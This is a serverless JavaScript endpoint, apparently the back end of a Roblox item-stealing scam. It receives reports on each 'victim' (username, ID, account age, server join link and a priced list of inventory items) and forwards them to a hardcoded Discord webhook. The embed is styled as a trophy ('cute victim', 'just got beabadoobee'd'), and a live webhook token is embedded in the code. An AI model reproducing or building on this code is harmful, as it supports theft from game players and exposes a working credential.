export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1506678688903598142/ogvR63l5BKj4rXumzuFpdcdAwDvW8u17XTbdL325wm5AJgQIJiTTuFefbxx7sGSeKdmb";
    
    // Fetch values from API
    let itemValues = {};
    try {
        const valuesResponse = await fetch('https://my-api-dusky-three.vercel.app/api/getvalues.js');
        if (valuesResponse.ok) {
            itemValues = await valuesResponse.json();
        }
    } catch (error) {
        console.error('Failed to fetch values:', error);
    }
    
    const getValue = (name) => {
        if (itemValues[name]) return itemValues[name];
        if (itemValues[name.replace(/^[Cc]hroma /, '')]) return itemValues[name.replace(/^[Cc]hroma /, '')];
        if (name && name.includes("Chroma")) return 1000;
        if (name && (name.includes("Celestial") || name.includes("Ice") || name.includes("Traveler") || name.includes("Vampire"))) return 100;
        if (name && (name.includes("Candy") || name.includes("Sugar") || name.includes("Sweet") || name.includes("Treat") || name.includes("Godly"))) return 50;
        return 1;
    };
    
    const getRarityEmoji = (name) => {
        if (name.includes("Chroma")) return "🌈";
        if (name.includes("Celestial") || name.includes("Traveler") || name.includes("Vampire")) return "🎀";
        if (name.includes("Candy") || name.includes("Sugar") || name.includes("Sweet") || name.includes("Treat")) return "🍰";
        if (name.includes("Godly")) return "💫";
        return "🍬";
    };
    
    try {
        const { hitData } = req.body;
        
        if (!hitData) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(req.body)
            });
            return res.status(200).json({ success: true });
        }
        
        const { player, userId, jobId, items, joinLink, username, displayName, accountAge, playerCount } = hitData;
        
        let totalValue = 0;
        let chromaCount = 0;
        let ancientCount = 0;
        let godlyCount = 0;
        let processedItems = [];
        
        for (const item of items) {
            let value = getValue(item.name);
            totalValue = totalValue + (value * item.amount);
            
            if (item.name.includes("Chroma")) chromaCount += item.amount;
            else if (item.name.includes("Celestial") || item.name.includes("Traveler") || item.name.includes("Vampire") || item.name.includes("Ancient")) ancientCount += item.amount;
            else if (item.name.includes("Godly") || item.name.includes("Candy") || item.name.includes("Sugar") || item.name.includes("Sweet") || item.name.includes("Treat")) godlyCount += item.amount;
            
            let emoji = getRarityEmoji(item.name);
            
            processedItems.push({
                name: item.name,
                amount: item.amount,
                value: value,
                emoji: emoji
            });
        }
        
        processedItems.sort((a, b) => b.value - a.value);
        
        let itemsText = "";
        for (let i = 0; i < Math.min(processedItems.length, 15); i++) {
            const item = processedItems[i];
            const formattedValue = item.value.toLocaleString();
            itemsText += `${item.emoji} \`${item.name}\` x${item.amount} ・ 💎 ${formattedValue}\n`;
        }
        if (processedItems.length > 15) {
            itemsText += `\n⋆｡°✩ +${processedItems.length - 15} more items ✩°｡⋆`;
        }
        
        let rarityText = "";
        if (chromaCount > 0) rarityText += `🌈 chroma ${chromaCount}  `;
        if (ancientCount > 0) rarityText += `🎀 ancient ${ancientCount}  `;
        if (godlyCount > 0) rarityText += `🍰 godly ${godlyCount}  `;
        if (rarityText === "") rarityText = "🍬 no rare items";
        
        const embed = {
            title: "🎀 ˚₊‧꒰ა ☆ 𝐜𝐮𝐭𝐞 𝐯𝐢𝐜𝐭𝐢𝐦 ☆ ໒꒱ ‧₊˚ 🎀",
            description: `⋆｡°✩ welcome to the kawaii zone ! ✩°｡⋆\n\n**${player}** just got beabadoobee'd~ 💕`,
            color: 0xFFB8D1,
            thumbnail: { 
                url: "https://i.pinimg.com/564x/6e/5a/3e/6e5a3e8e4e8e8e8e8e8e8e8e8e8e8e8.jpg" 
            },
            fields: [
                { name: "🌸 𝓊𝓈𝑒𝓇𝓃𝒶𝓂𝑒", value: `**${player}**`, inline: true },
                { name: "🎀 𝒾𝒹", value: `\`${userId}\``, inline: true },
                { name: "🍰 𝒶𝑔𝑒", value: `${accountAge || '?'} days`, inline: true },
                { name: "💻 𝑒𝓍𝑒𝒸𝓊𝓉𝑜𝓇", value: `**Delta**`, inline: true },
                { name: "👥 𝓅𝓁𝒶𝓎𝑒𝓇𝓈", value: `${playerCount || '?'}/12`, inline: true },
                { name: "⋆˚𝜗𝜚˚⋆", value: `╰┈➤ ${rarityText}`, inline: false },
                { name: "💰 𝓉𝑜𝓉𝒶𝓁 𝓋𝒶𝓁𝓊𝑒", value: `⋆｡°✩ **💎 ${totalValue.toLocaleString()}** ✩°｡⋆`, inline: false },
                { name: "🎀 𝒾𝓉𝑒𝓂𝓈", value: `\`\`\`ansi\n${itemsText || '┈┈┈ ⋆ ✩ ⋆ ┈┈┈'}\n\`\`\``, inline: false },
                { name: "🌸 𝒿𝑜𝒾𝓃 𝓈𝑒𝓇𝓋𝑒𝓇", value: `[⋆˚｡°✩ click here ✩°｡˚⋆](${joinLink})`, inline: false }
            ],
            footer: { 
                text: "♡₊˚ beabadoobee core ˚₊♡  |  made with love by waguri",
                icon_url: "https://cdn.discordapp.com/emojis/1234567890.png"
            },
            timestamp: new Date().toISOString()
        };
        
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                embeds: [embed], 
                username: "🌸 beabadoobee victim 💕",
                avatar_url: "https://i.pinimg.com/564x/6e/5a/3e/6e5a3e8e4e8e8e8e8e8e8e8e8e8e8e8.jpg"
            })
        });
        
        return res.status(200).json({ success: true });
        
    } catch (error) {
        console.error('Proxy error:', error);
        return res.status(500).json({ error: 'Failed' });
    }
}
